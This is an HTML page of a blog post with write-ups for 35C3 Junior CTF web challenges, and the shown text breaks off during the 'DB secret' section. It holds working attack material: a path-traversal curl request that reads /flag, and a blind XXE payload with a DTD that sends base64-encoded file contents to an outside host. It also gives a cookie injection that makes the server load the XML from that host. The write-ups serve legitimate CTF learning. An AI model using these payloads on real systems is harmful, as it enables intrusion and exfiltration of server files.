@@ -1,0 +1,2399 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="35c3ctf | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>35c3ctf · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">35c3ctf</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            35c3ctf
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4,364</span> / Reading time: <span class="post-count">26 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/28</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Junoir-ctf"><a href="#Junoir-ctf" class="headerlink" title="Junoir  ctf"></a>Junoir  ctf</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $lang = $_SERVER[&apos;HTTP_ACCEPT_LANGUAGE&apos;] ?? &apos;ot&apos;;</span><br><span class="line">  $lang = explode(&apos;,&apos;, $lang)[0];</span><br><span class="line">  $lang = str_replace(&apos;../&apos;, &apos;&apos;, $lang);</span><br><span class="line">  $c = file_get_contents(&quot;flags/$lang&quot;);</span><br><span class="line">  if (!$c) $c = file_get_contents(&quot;flags/ot&quot;);</span><br><span class="line">  echo &apos;&lt;img src=&quot;data:image/jpeg;base64,&apos; . base64_encode($c) . &apos;&quot;&gt;&apos;;</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:/mnt/d/ht-blog$ curl -H &quot;Accept-Language:....//....//....//....//flag&quot; &quot;http://35.207.132.47:84/&quot; | grep -oE Mz.*= | base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2707  100  2707    0     0   5745      0 --:--:-- --:--:-- --:--:--  5759</span><br><span class="line">35c3_this_flag_is_the_be5t_fl4g</span><br></pre></td></tr></table></figure>
+<h3 id="McDonald"><a href="#McDonald" class="headerlink" title="McDonald"></a>McDonald</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在backup目录下找.DS_Store,然后不断的找就行</span><br></pre></td></tr></table></figure>
+<h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function __autoload($cls) &#123;</span><br><span class="line">    include $cls;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Black &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Green &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if ($_=@$_GET[&apos;theme&apos;]) &#123;</span><br><span class="line">    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) &#123;</span><br><span class="line">      if (@class_exists($_)) &#123;</span><br><span class="line">        ($string = @$_GET[&apos;string&apos;]) || $string = false;</span><br><span class="line">        ($default = @$_GET[&apos;default&apos;]) || $default = false;</span><br><span class="line">        ($keyword = @$_GET[&apos;keyword&apos;]) || $keyword = false;</span><br><span class="line"></span><br><span class="line">        new $_($string, $default, $keyword, @$_GET[&apos;store&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_COOKIE[&apos;theme&apos;]) &#123;</span><br><span class="line">    $args = explode(&apos;-&apos;, $_);</span><br><span class="line">    if (class_exists($args[0])) &#123;</span><br><span class="line">      new $args[0]($args[1], $args[2], $args[3], &apos;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_GET[&apos;info&apos;]) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>打印所有可用的类:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(get_declared_classes());</span><br></pre></td></tr></table></figure>
+<p>可以利用<code>SimpleXMLElement</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement implements Traversable &#123;</span><br><span class="line">/* Methods */</span><br><span class="line">final public __construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = &quot;&quot; [, bool $is_prefix = FALSE ]]]] )</span><br><span class="line">public void addAttribute ( string $name [, string $value [, string $namespace ]] )</span><br><span class="line">public SimpleXMLElement addChild ( string $name [, string $value [, string $namespace ]] )</span><br><span class="line">public mixed asXML ([ string $filename ] )</span><br><span class="line">public SimpleXMLElement attributes ([ string $ns = NULL [, bool $is_prefix = FALSE ]] )</span><br><span class="line">public SimpleXMLElement children ([ string $ns [, bool $is_prefix = FALSE ]] )</span><br><span class="line">public int count ( void )</span><br><span class="line">public array getDocNamespaces ([ bool $recursive = FALSE [, bool $from_root = TRUE ]] )</span><br><span class="line">public string getName ( void )</span><br><span class="line">public array getNamespaces ([ bool $recursive = FALSE ] )</span><br><span class="line">public bool registerXPathNamespace ( string $prefix , string $ns )</span><br><span class="line">public string __toString ( void )</span><br><span class="line">public array xpath ( string $path )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后就可以利用blind xxe。</p>
+<p>xxe.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://39.106.97.201/xxe.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+<p>xxe.dtd:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://39.106.97.201/attack?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>发送请求:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &quot;theme=SimpleXMlElement-http://39.106.97.201/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82/&quot;</span><br></pre></td></tr></table></figure>
+<p>getflag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35c3_even_a_blind_squirrel_finds_a_nut_now_and_then</span><br></pre></td></tr></table></figure>
+<h3 id="collider"><a href="#collider" class="headerlink" title="collider"></a>collider</h3><p>hash碰撞工具：</p>
+<ul>
+<li><p><a href="https://github.com/cr-marcstevens/hashclash.git" rel="external nofollow" target="_blank">https://github.com/cr-marcstevens/hashclash.git</a></p>
+<p>使用方法: <code>sh cpc.sh giveflag.pdf noflag.pdf</code></p>
+</li>
+</ul>
+<h3 id="DB-secret"><a href="#DB-secret" class="headerlink" title="DB secret"></a>DB secret</h3><p><code>pyserver/server.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span 